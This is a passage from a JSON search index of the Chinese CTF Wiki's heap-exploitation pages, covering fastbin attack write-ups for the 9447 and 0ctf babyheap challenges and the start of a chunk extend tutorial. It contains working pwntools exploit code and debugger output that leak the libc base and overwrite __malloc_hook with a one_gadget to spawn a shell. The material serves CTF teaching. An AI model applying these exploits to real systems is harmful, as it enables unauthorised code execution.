( n ) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline ( n )   \u6548\u679c\u5982\u4e0b  pwndbg  fastbins \nfastbins\n0x20: 0x0\n0x30: 0x1d19320 \u25c2\u2014 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x1d191b0 \u2014\u25b8 0x1d19010 \u2014\u25b8 0x1d191b0 \u25c2\u2014 0x1d19010\n0x80: 0x0", 
            "title": "\u6784\u9020 fastbin \u5faa\u73af\u94fe\u8868"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#malloc_hook-chunk", 
            "text": "\u6b64\u65f6\uff0cfastbin \u7684\u94fe\u8868\u4e3a b- a- b- a- \u2026\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5728\u7533\u8bf7\u7b2c\u4e00\u4e2a\u76f8\u540c\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u8bbe\u7f6e b \u7684 fd \u4e3a malloc_hook \u9644\u8fd1\u5904\u7684 chunk  0x7fd798586aed \uff08\u8fd9\u91cc\u662f\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4ee3\u7801\u4e2d\u9700\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\uff09\u3002  pwndbg  print  ( void* ) main_arena  $1   =   ( void * )  0x7fd798586b20  main_arena \npwndbg  x/8gx 0x7fd798586b20-16\n0x7fd798586b10  __malloc_hook : 0x0000000000000000  0x0000000000000000\n0x7fd798586b20  main_arena :    0x0000000000000000  0x0000000000bce130\n0x7fd798586b30  main_arena+16 : 0x0000000000000000  0x0000000000000000\n0x7fd798586b40  main_arena+32 : 0x0000000000000000  0x0000000000000000\npwndbg  find_fake_fast 0x7fd798586b10 0x7f\nFAKE CHUNKS\n0x7fd798586aed PREV_INUSE IS_MMAPED NON_MAIN_ARENA  { \n   prev_size   =   15535264025435701248 , \n   size   =   127 , \n   fd   =  0xd798247e20000000, \n   bk   =  0xd798247a0000007f, \n   fd_nextsize   =  0x7f, \n   bk_nextsize   =  0x0 } \npwndbg  print /x 0x7fd798586b10-0x7fd798586aed $2   =  0x23\npwndbg  print /x 0x7fd798586b20-0x7fd798586aed $3   =  0x33  \u90a3\u4e48\u5f53\u518d\u6b21\u5206\u914d b \u7684\u65f6\u5019\uff0c\u7531\u4e8e\u6b64\u65f6 b \u7684 fd \u5df2\u7ecf\u88ab\u6211\u4eec\u4fee\u6539\u4e3a\u4e86malloc_hook\u9644\u8fd1\u7684\u5730\u5740\uff0c\u6240\u4ee5\u8fd9\u65f6\u5019\u6211\u4eec\u518d\u6b21\u5206\u914d\u4e00\u4e2a chunk\uff0c\u5c31\u4f1a\u6307\u5411  0x7fd798586aed \u3002 \u6b64\u540e\u4fbf\u53ea\u9700\u8981\u5c06 malloc_hook \u4fee\u6539\u4e3a one_gadget \u5730\u5740\u5c31\u53ef\u4ee5\u62ff\u5230 shell \u4e86\u3002       # 3. fastbin attack to malloc_hook nearby chunk \n     fake_chunk_addr   =   main_arena_addr   -   0x33 \n     fake_chunk   =   p64 ( fake_chunk_addr ) . ljust ( 0x60 ,   f ) \n\n     index_sentence ( fake_chunk ) \n\n     index_sentence ( a   *   0x60 ) \n\n     index_sentence ( b   *   0x60 ) \n\n     one_gadget_addr   =   libc_base   +   0xf02a4 \n     payload   =   a   *   0x13   +   p64 ( one_gadget_addr ) \n     payload   =   payload . ljust ( 0x60 ,   f ) \n     #gdb.attach(p) \n     index_sentence ( payload ) \n     p . interactive ()   \u8fd9\u91cc\u53ef\u80fd\u9700\u8981\u591a\u9009\u62e9\u51e0\u4e2a one_gadget \u5730\u5740\uff0c\u56e0\u4e3a one_gadget \u6210\u529f\u662f\u6709\u6761\u4ef6\u7684\u3002", 
            "title": "\u5206\u914d malloc_hook \u9644\u8fd1chunk"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#shell", 
            "text": "\u279c  2015_9447ctf_search-engine git: ( master )  python exp.py [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 ) \n    FORTIFY:  Enabled [ + ]  Starting  local  process  ./search : pid  31158  [ * ]  PID:  31158  [ + ]  unsortedbin addr: 0x7f802e73bb78 [ + ]  libc base addr: 0x7f802e377000 [ * ]  Switching to interactive mode\nEnter the sentence:\n$ ls\nexp.py       search      search.id1  search.nam\nlibc.so.6  search.id0  search.id2  search.til  \u5f53\u7136\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e00\u79cd \u65b9\u6cd5 \uff0c\u5c06 chunk \u5206\u914d\u5230\u6808\u4e0a\u3002", 
            "title": "shell"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#2017-0ctf-babyheap", 
            "text": "", 
            "title": "2017 0ctf babyheap"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_25", 
            "text": "\u279c  2017_0ctf_babyheap git: ( master )  file babyheap                            \nbabyheap: ELF  64 -bit LSB shared object, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.32, BuildID [ sha1 ]= 9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped\n\u279c  2017_0ctf_babyheap git: ( master )  checksec babyheap    [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2017_0ctf_babyheap/babyheap \n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled  64\u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5168\u90e8\u5f00\u542f\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_26", 
            "text": "\u7a0b\u5e8f\u662f\u4e00\u4e2a\u5806\u5206\u914d\u5668\uff0c\u4e3b\u8981\u7531\u4ee5\u4e0b\u56db\u79cd\u529f\u80fd     puts ( 1. Allocate ); \n   puts ( 2. Fill ); \n   puts ( 3. Free ); \n   puts ( 4. Dump ); \n   puts ( 5. Exit ); \n   return   printf ( Command:  );   \u5176\u4e2d\uff0c\u6bcf\u6b21\u8bfb\u53d6\u547d\u4ee4\u7684\u51fd\u6570\u7531\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\u7684\u51fd\u6570\u800c\u51b3\u5b9a\u3002  \u901a\u8fc7\u5206\u914d\u51fd\u6570  void   __fastcall   allocate ( __int64   a1 )  { \n   signed   int   i ;   // [rsp+10h] [rbp-10h] \n   signed   int   v2 ;   // [rsp+14h] [rbp-Ch] \n   void   * v3 ;   // [rsp+18h] [rbp-8h] \n\n   for   (   i   =   0 ;   i   =   15 ;   ++ i   ) \n   { \n     if   (   !* ( _DWORD   * )( 24LL   *   i   +   a1 )   ) \n     { \n       printf ( Size:  ); \n       v2   =   read_num (); \n       if   (   v2     0   ) \n       { \n         if   (   v2     4096   ) \n           v2   =   4096 ; \n         v3   =   calloc ( v2 ,   1uLL ); \n         if   (   ! v3   ) \n           exit ( - 1 ); \n         * ( _DWORD   * )( 24LL   *   i   +   a1 )   =   1 ; \n         * ( _QWORD   * )( a1   +   24LL   *   i   +   8 )   =   v2 ; \n         * ( _QWORD   * )( a1   +   24LL   *   i   +   16 )   =   v3 ; \n         printf ( Allocate Index %d \\n ,   ( unsigned   int ) i ); \n       } \n       return ; \n     } \n   }  }   \u7533\u8bf7\u7684 chunk \u7684\u6700\u5927\u4e3a 4096\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u6bcf\u4e2a chunk \u4e3b\u8981\u6709\u4e09\u4e2a\u5b57\u6bb5\uff1a\u662f\u5426\u5728\u4f7f\u7528\uff0c\u5806\u5757\u5927\u5c0f\uff0c\u5806\u5757\u4f4d\u7f6e\u3002\u6545\u800c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u5bf9\u5e94\u7684\u7ed3\u6784\u4f53\u3002  00000000 chunk           struc ; (sizeof=0x18, mappedto_6)\n00000000 inuse           dq ?\n00000008 size            dq ?\n00000010 ptr             dq ?\n00000018 chunk           ends  \u9700\u8981\u6ce8\u610f\u7684\u662f\u5806\u5757\u662f\u7531 calloc \u5206\u914d\u7684\uff0c\u6240\u4ee5 chunk \u4e2d\u7684\u5185\u5bb9\u5168\u90fd\u4e3a \\x00 \u3002  \u5728\u586b\u5145\u5185\u5bb9\u7684\u529f\u80fd\u4e2d\uff0c\u4f7f\u7528\u8bfb\u53d6\u5185\u5bb9\u7684\u51fd\u6570\u662f\u76f4\u63a5\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u5e76\u6ca1\u6709\u8bbe\u7f6e\u5b57\u7b26\u4e32\u7ed3\u5c3e\u3002 \u800c\u4e14\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0c\u8fd9\u4e2a\u6307\u5b9a\u957f\u5ea6\u662f\u6211\u4eec\u6307\u5b9a\u7684\uff0c\u5e76\u4e0d\u662f\u4e4b\u524d chunk \u5206\u914d\u65f6\u6307\u5b9a\u7684\u957f\u5ea6\uff0c\u6240\u4ee5\u8fd9\u91cc\u5c31\u51fa\u73b0\u4e86\u4efb\u610f\u5806\u6ea2\u51fa\u7684\u60c5\u5f62\u3002  __int64   __fastcall   fill ( chunk   * a1 )  { \n   __int64   result ;   // rax \n   int   v2 ;   // [rsp+18h] [rbp-8h] \n   int   v3 ;   // [rsp+1Ch] [rbp-4h] \n\n   printf ( Index:  ); \n   result   =   read_num (); \n   v2   =   result ; \n   if   (   ( signed   int ) result   =   0     ( signed   int ) result   =   15   ) \n   { \n     result   =   LODWORD ( a1 [( signed   int ) result ]. inuse ); \n     if   (   ( _DWORD ) result   ==   1   ) \n     { \n       printf ( Size:  ); \n       result   =   read_num (); \n       v3   =   result ; \n       if   (   ( signed   int ) result     0   ) \n       { \n         printf ( Content:  ); \n         result   =   read_content (( char   * ) a1 [ v2 ]. ptr ,   v3 ); \n       } \n     } \n   } \n   return   result ;  }   \u5728\u91ca\u653echunk\u7684\u529f\u80fd\u4e2d\u8be5\u8bbe\u7f6e\u7684\u90fd\u8bbe\u7f6e\u4e86\u3002  __int64   __fastcall   free_chunk ( chunk   * a1 )  { \n   __int64   result ;   // rax \n   int   v2 ;   // [rsp+1Ch] [rbp-4h] \n\n   printf ( Index:  ); \n   result   =   read_num (); \n   v2   =   result ; \n   if   (   ( signed   int ) result   =   0     ( signed   int ) result   =   15   ) \n   { \n     result   =   LODWORD ( a1 [( signed   int ) result ]. inuse ); \n     if   (   ( _DWORD ) result   ==   1   ) \n     { \n       LODWORD ( a1 [ v2 ]. inuse )   =   0 ; \n       a1 [ v2 ]. size   =   0LL ; \n       free ( a1 [ v2 ]. ptr ); \n       result   =   ( __int64 ) a1 [ v2 ]; \n       * ( _QWORD   * )( result   +   16 )   =   0LL ; \n     } \n   } \n   return   result ;  }   dump \u5c31\u662f\u8f93\u51fa\u5bf9\u5e94\u7d22\u5f15 chunk \u7684\u5185\u5bb9\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_27", 
            "text": "\u53ef\u4ee5\u786e\u5b9a\u7684\u662f\uff0c\u6211\u4eec\u4e3b\u8981\u6709\u7684\u6f0f\u6d1e\u5c31\u662f\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u3002\u7531\u4e8e\u8be5\u7a0b\u5e8f\u51e0\u4e4e\u6240\u6709\u4fdd\u62a4\u90fd\u5f00\u542f\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u8981\u6709\u4e00\u4e9b\u6cc4\u6f0f\u624d\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u7684\u6d41\u7a0b\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u5229\u7528 unsorted bin \u5730\u5740\u6cc4\u6f0f libc \u57fa\u5730\u5740\u3002  \u5229\u7528 fastbin attack \u5c06chunk \u5206\u914d\u5230 malloc_hook \u9644\u8fd1\u3002", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#libc_1", 
            "text": "\u7531\u4e8e\u6211\u4eec\u662f\u5e0c\u671b\u4f7f\u7528 unsorted bin \u6765\u6cc4\u6f0f libc \u57fa\u5730\u5740\uff0c\u6240\u4ee5\u5fc5\u987b\u8981\u6709 chunk \u53ef\u4ee5\u88ab\u94fe\u63a5\u5230 unsorted bin \u4e2d\uff0c\u6240\u4ee5\u8be5 chunk \u4e0d\u80fd\u4f7f fastbin chunk\uff0c\u4e5f\u4e0d\u80fd\u548c top chunk \u76f8\u90bb\u3002\u56e0\u4e3a\u524d\u8005\u4f1a\u88ab\u6dfb\u52a0\u5230 fastbin \u4e2d\uff0c\u540e\u8005\u5728\u4e0d\u662ffastbin \u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u88ab\u5408\u5e76\u5230 top chunk \u4e2d\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u8fd9\u91cc\u6784\u9020\u4e00\u4e2a small bin chunk\u3002\u5728\u5c06\u8be5 chunk \u91ca\u653e\u5230 unsorted bin \u7684\u540c\u65f6\uff0c\u4e5f\u9700\u8981\u8ba9\u53e6\u5916\u4e00\u4e2a\u6b63\u5728\u4f7f\u7528\u7684 chunk \u53ef\u4ee5\u540c\u65f6\u6307\u5411\u8be5 chunk \u7684\u4f4d\u7f6e\u3002\u8fd9\u6837\u624d\u53ef\u4ee5\u8fdb\u884c\u6cc4\u6f0f\u3002\u5177\u4f53\u8bbe\u8ba1\u5982\u4e0b       # 1. leak libc base \n     allocate ( 0x10 )    # idx 0, 0x00 \n     allocate ( 0x10 )    # idx 1, 0x20 \n     allocate ( 0x10 )    # idx 2, 0x40 \n     allocate ( 0x10 )    # idx 3, 0x60 \n     allocate ( 0x80 )    # idx 4, 0x80 \n     # free idx 1, 2, fastbin[0]- idx1- idx2- NULL \n     free ( 2 ) \n     free ( 1 )   \u9996\u5148\uff0c\u6211\u4eec\u7533\u8bf7\u4e86 5 \u4e2achunk\uff0c\u5e76\u91ca\u653e\u4e86\u4e24\u4e2achunk\uff0c\u6b64\u65f6\u5806\u7684\u60c5\u51b5\u5982\u4e0b\u3002  pwndbg  x/20gx 0x55a03ca22000\n0x55a03ca22000: 0x0000000000000000  0x0000000000000021 idx  0 \n0x55a03ca22010: 0x0000000000000000  0x0000000000000000\n0x55a03ca22020: 0x0000000000000000  0x0000000000000021 idx  1 \n0x55a03ca22030: 0x000055a03ca22040  0x0000000000000000\n0x55a03ca22040: 0x0000000000000000  0x0000000000000021 idx  2 \n0x55a03ca22050: 0x0000000000000000  0x0000000000000000\n0x55a03ca22060: 0x0000000000000000  0x0000000000000021 idx  3 \n0x55a03ca22070: 0x0000000000000000  0x0000000000000000\n0x55a03ca22080: 0x0000000000000000  0x0000000000000091 idx  4 \n0x55a03ca22090: 0x0000000000000000  0x0000000000000000\npwndbg  fastbins \nfastbins\n0x20: 0x55a03ca22020 \u2014\u25b8 0x55a03ca22040 \u25c2\u2014 0x0\n0x30: 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x0\n0x80: 0x0  \u5f53\u6211\u4eec\u7f16\u8f91 idx0 \u540e\uff0c\u786e\u5b9e\u5df2\u7ecf\u5c06\u5176\u6307\u5411idx4\u4e86\u3002\u8fd9\u91cc\u4e4b\u6240\u4ee5\u53ef\u4ee5\u6210\u529f\u662f\u56e0\u4e3a\u5806\u7684\u59cb\u7ec8\u662f 4KB \u5bf9\u9f50\u7684\uff0c\u6240\u4ee5idx 4\u7684\u8d77\u59cb\u5730\u5740\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u5fc5\u7136\u662f0x80\u3002       # edit idx 0 chunk to particial overwrite idx1 s fd to point to idx4 \n     payload   =   0x10   *   a   +   p64 ( 0 )   +   p64 ( 0x21 )   +   p8 ( 0x80 ) \n     fill ( 0 ,   len ( payload ),   payload )   \u4fee\u6539\u6210\u529f\u540e\u5982\u4e0b  pwndbg  x/20gx 0x55a03ca22000\n0x55a03ca22000: 0x0000000000000000  0x0000000000000021\n0x55a03ca22010: 0x6161616161616161  0x6161616161616161\n0x55a03ca22020: 0x0000000000000000  0x0000000000000021\n0x55a03ca22030: 0x000055a03ca22080  0x0000000000000000\n0x55a03ca22040: 0x0000000000000000  0x0000000000000021\n0x55a03ca22050: 0x0000000000000000  0x0000000000000000\n0x55a03ca22060: 0x0000000000000000  0x0000000000000021\n0x55a03ca22070: 0x0000000000000000  0x0000000000000000\n0x55a03ca22080: 0x0000000000000000  0x0000000000000091\n0x55a03ca22090: 0x0000000000000000  0x0000000000000000\npwndbg  fastbins \nfastbins\n0x20: 0x55a03ca22020 \u2014\u25b8 0x55a03ca22080 \u25c2\u2014 0x0\n0x30: 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x0\n0x80: 0x0  \u90a3\u4e48\uff0c\u5f53\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u4e24\u4e2a\u65f6\uff0c\u7b2c\u4e8c\u4e2a\u7533\u8bf7\u5230\u7684\u5c31\u662fidx 4\u5904\u7684chunk\u3002\u4e3a\u4e86\u80fd\u591f\u7533\u8bf7\u6210\u529f\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd idx4 \u7684size \u4e0e\u5f53\u524d fastbin \u7684\u5927\u5c0f\u4e00\u81f4\uff0c\u6240\u4ee5\uff0c\u6211\u4eec\u5f97\u4fee\u6539\u5b83\u7684\u5927\u5c0f\u3002\u7533\u8bf7\u6210\u529f\u540e\uff0cidx2\u4f1a\u6307\u5411idx4\u3002       # if we want to allocate at idx4, we must set it s size as 0x21 \n     payload   =   0x10   *   a   +   p64 ( 0 )   +   p64 ( 0x21 ) \n     fill ( 3 ,   len ( payload ),   payload ) \n     allocate ( 0x10 )    # idx 1 \n     allocate ( 0x10 )    # idx 2, which point to idx4 s location   \u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u5c06 idx 4 \u653e\u5230 unsorted bin \u4e2d\u7684\u8bdd\uff0c\u4e3a\u4e86\u9632\u6b62\u5176\u4e0etop chunk \u5408\u5e76\uff0c\u6211\u4eec\u9700\u8981\u518d\u6b21\u7533\u8bf7\u4e00\u4e2achunk\u3002\u6b64\u540e\u518d\u91ca\u653e idx4 \u5c31\u4f1a\u8fdb\u5165 unsorted bin\u4e2d\u53bb\u4e86\u3002\u6b64\u65f6\u7531\u4e8e idx2 \u4e5f\u6307\u5411\u8fd9\u4e2a\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u5c55\u793a\u4ed6\u7684\u5185\u5bb9\u5c31\u53ef\u4ee5\u5f97\u5230unsorted bin\u7684\u5730\u5740\u4e86\u3002       # if want to free idx4 to unsorted bin, we must fix its size \n     payload   =   0x10   *   a   +   p64 ( 0 )   +   p64 ( 0x91 ) \n     fill ( 3 ,   len ( payload ),   payload ) \n     # allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk \n     allocate ( 0x80 )    # idx 5 \n     free ( 4 ) \n     # as idx 2 point to idx4, just show this \n     dump ( 2 ) \n     p . recvuntil ( Content:  \\n ) \n     unsortedbin_addr   =   u64 ( p . recv ( 8 )) \n     main_arena   =   unsortedbin_addr   -   offset_unsortedbin_main_arena \n     log . success ( main arena addr:    +   hex ( main_arena )) \n     main_arena_offset   =   0x3c4b20 \n     libc_base   =   main_arena   -   main_arena_offset \n     log . success ( libc base addr:    +   hex ( libc_base ))", 
            "title": "\u6cc4\u6f0f libc \u57fa\u5730\u5740"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#chunkmalloc_hook", 
            "text": "\u7531\u4e8e malloc hook \u9644\u8fd1\u7684 chunk \u5927\u5c0f\u4e3a 0x7f\uff0c\u6240\u4ee5\u6570\u636e\u533a\u57df\u4e3a0x60\u3002\u8fd9\u91cc\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u7684\u65f6\u5019\uff0c\u5bf9\u5e94 fastbin \u94fe\u8868\u4e2d\u6ca1\u6709\u76f8\u5e94\u5927\u5c0fchunk\uff0c\u6240\u4ee5\u6839\u636e\u5806\u5206\u914d\u5668\u89c4\u5219\uff0c\u5b83\u4f1a\u4f9d\u6b21\u5904\u7406unsorted bin\u4e2d\u7684chunk\uff0c\u5c06\u5176\u653e\u5165\u5230\u5bf9\u5e94\u7684bin\u4e2d\uff0c\u4e4b\u540e\u4f1a\u518d\u6b21\u5c1d\u8bd5\u5206\u914d chunk\uff0c\u56e0\u4e3a\u4e4b\u524d\u91ca\u653e\u7684 chunk \u6bd4\u5f53\u524d\u7533\u8bf7\u7684 chunk \u5927\uff0c\u6240\u4ee5\u53ef\u4ee5\u4ece\u5176\u524d\u9762\u5206\u5272\u51fa\u6765\u4e00\u5757\u3002\u6240\u4ee5 idx2 \u4ecd\u7136\u6307\u5411\u8be5\u4f4d\u7f6e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u7684\u529e\u6cd5\u5148\u91ca\u653e\u7533\u8bf7\u5230\u7684chunk\uff0c\u7136\u540e\u518d\u6b21\u4fee\u6539 fd \u6307\u9488\u4e3a fake chunk \u5373\u53ef\u3002\u6b64\u540e\u6211\u4eec\u4fee\u6539 malloc_hook \u5904\u7684\u6307\u9488\u5373\u53ef\u5f97\u5230\u89e6\u53d1 onegadget\u3002  # 2. malloc to malloc_hook nearby  # allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4  allocate ( 0x60 )  free ( 4 )  # edit idx4 s fd point to fake chunk  fake_chunk_addr   =   main_arena   -   0x33  fake_chunk   =   p64 ( fake_chunk_addr )  fill ( 2 ,   len ( fake_chunk ),   fake_chunk )  allocate ( 0x60 )    # idx 4  allocate ( 0x60 )    # idx 6  one_gadget_addr   =   libc_base   +   0x4526a  payload   =   0x13   *   a   +   p64 ( one_gadget_addr )  fill ( 6 ,   len ( payload ),   payload )  # trigger malloc_hook  allocate ( 0x100 )  p . interactive ()   \n\u540c\u65f6\uff0c\u8fd9\u91cc\u7684 onegadget \u5730\u5740\u4e5f\u53ef\u80fd\u9700\u8981\u5c1d\u8bd5\u591a\u6b21\u3002", 
            "title": "\u5206\u914dchunk\u5230malloc_hook\u9644\u8fd1"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_28", 
            "text": "L-CTF2016\u2013pwn200", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_29", 
            "text": "https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/  http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html  https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717", 
            "title": "\u53c2\u8003\u6587\u732e"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/", 
            "text": "Chunk Extend/Shrink\n\n\n\u4ecb\u7ecd\n\n\nchunk extend/shrink \u662f\u5806\u6f0f\u6d1e\u7684\u4e00\u79cd\u5e38\u89c1\u7684\u5229\u7528\u624b\u6cd5\uff0c\u4e0e\u5176\u4ed6\u5806\u6f0f\u6d1e\u7684\u5229\u7528\u76f8\u540c\uff0cchunk extend/shrink \u653b\u51fb\u540c\u6837\u9700\u8981\u6709\u53ef\u4ee5\u63a7\u5236 malloc_chunk \u7684\u6f0f\u6d1e\u3002\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u9700\u8981\u4ee5\u4e0b\u7684\u5148\u51b3\u6761\u4ef6\uff1a\n\n\n\n\n\u7a0b\u5e8f\u4e2d\u5b58\u5728\u57fa\u4e8e\u5806\u7684\u6f0f\u6d1e\n\n\n\u6f0f\u6d1e\u53ef\u4ee5\u4f7f\u5f97 malloc_chunk \u80fd\u591f\u88ab\u653b\u51fb\u8005\u63a7\u5236\n\n\n\n\n\u539f\u7406\n\n\n\u8be5\u6280\u672f\u4f9d\u8d56\u4e8e ptmalloc(aka glibc) \u83b7\u53d6 malloc_chunk \u7684\u5404\u79cd\u5c5e\u6027\u7684\u5b8f\u3002\n\n\n\u5728 ptmalloc \u4e2d\uff0c\u83b7\u53d6 chunk \u5757\u5927\u5c0f\u7684\u64cd\u4f5c\u5982\u4e0b\n\n\n/* Get size, ignoring use bits */\n#define chunksize(p) (chunksize_nomask(p) \n ~(SIZE_BITS))\n\n/* Like chunksize, but do not mask SIZE_BITS.  */\n#define chunksize_nomask(p) ((p)-\nmchunk_size)\n\n\n\u4e00\u79cd\u662f\u76f4\u63a5\u83b7\u53d6 chunk \u7684\u5927\u5c0f\uff0c\u4e0d\u5ffd\u7565\u63a9\u7801\u90e8\u5206\uff0c\u53e6\u5916\u4e00\u79cd\u662f\u5ffd\u7565\u63a9\u7801\u90e8\u5206\u3002\n\n\n\u5728 ptmalloc \u4e2d\uff0c\u83b7\u53d6\u4e0b\u4e00 chunk \u5757\u5730\u5740\u7684\u64cd\u4f5c\u5982\u4e0b\n\n\n/* Ptr to next physical malloc_chunk. */\n#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))\n\n\n\u5373\u4f7f\u7528\u5f53\u524d\u5757\u6307\u9488\u52a0\u4e0a\u5f53\u524d\u5757\u5927\u5c0f\u3002\n\n\n\u5728 ptmalloc \u4e2d\uff0c\u83b7\u53d6\u524d\u4e00\u4e2a chunk \u4fe1\u606f\u7684\u64cd\u4f5c\u5982\u4e0b\n\n\n/* Size of the chunk below P.  Only valid if prev_inuse (P).  */\n#define prev_size(p) ((p)-\nmchunk_prev_size)\n\n/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */\n#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))\n\n\n\u5373\u901a\u8fc7malloc_chunk-\nprev_size\u83b7\u53d6\u524d\u4e00\u5757\u5927\u5c0f\uff0c\u7136\u540e\u4f7f\u7528\u672c chunk \u5730\u5740\u51cf\u53bb\u6240\u5f97\u5927\u5c0f\u3002\n\n\n\u5728 ptmalloc\uff0c\u5224\u65ad\u5f53\u524d chunk \u662f\u5426\u662fuse\u72b6\u6001\u7684\u64cd\u4f5c\u5982\u4e0b\uff1a\n\n#define inuse(p)\n    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-\nmchunk_size) \n PREV_INUSE)\n\n\n\u5373\u67e5\u770b\u4e0b\u4e00 chunk \u7684 prev_inuse \u57df\uff0c\u800c\u4e0b\u4e00\u5757\u5730\u5740\u53c8\u5982\u6211\u4eec\u524d\u9762\u6240\u8ff0\u662f\u6839\u636e\u5f53\u524d chunk \u7684 size \u8ba1\u7b97\u5f97\u51fa\u7684\u3002\n\n\n\u66f4\u591a\u7684\u64cd\u4f5c\u8be6\u89c1 \n\u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784\n \u4e00\u8282\u3002\u7b80\u800c\u8a00\u4e4b\uff0cchunk extend/shrink \u5229\u7528\u5c31\u662f\u901a\u8fc7\u5bf9 size/pre_size \u57df\u8fdb\u884c\u63a7\u5236\u6765\u5b9e\u73b0\u7684\u201c\u653e\u7f29\u201d\u5229\u7528\u3002\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5f88\u5c11\u89c1\u5230\u8fdb\u884c chunk shrink \u7684\u64cd\u4f5c\u3002\u6240\u4ee5\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd chunk extend \u7684\u5229\u7528\u3002\n\n\n\u57fa\u672c\u793a\u4f8b1\n\n\n\u7b80\u5355\u6765\u8bf4\uff0c\u8be5\u5229\u7528\u7684\u6548\u679c\u662f\u901a\u8fc7\u66f4\u6539\u7b2c\u4e00\u4e2a\u5757\u7684\u5927\u5c0f\u6765\u63a7\u5236\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9\u3002\n\n\u6ce8\u610f\uff0c\u6211\u4eec\u7684\u793a\u4f8b\u90fd\u662f\u572864\u4f4d\u7684\u7a0b\u5e8f\u3002\u5982\u679c\u60f3\u572832\u4f4d\u4e0b\u8fdb\u884c\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u628a8\u5b57\u8282\u504f\u79fb\u6539\u4e3a4\u5b57\u8282\n\u3002\n\nint main(void)\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x10);//\u5206\u914d\u7b2c\u4e00\u4e2a0x10\u7684chunk\n    malloc(0x10);//\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk\n\n    *(long long *)((long long)ptr-0x8)=0x41;// \u4fee\u6539\u7b2c\u4e00\u4e2a\u5757\u7684size\u57df\n\n    free(ptr);\n    ptr1=malloc(0x30);// \u5b9e\u73b0 extend\uff0c\u63a7\u5236\u4e86\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9\n    return 0;\n}\n\n\n\u5f53\u4e24\u4e2amalloc\u8bed\u53e5\u6267\u884c\u4e4b\u540e\uff0c\u5806\u7684\u5185\u5b58\u5206\u5e03\u5982\u4e0b\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n=== chunk 1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021 \n=== chunk 2\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000020fc1 \n=== top 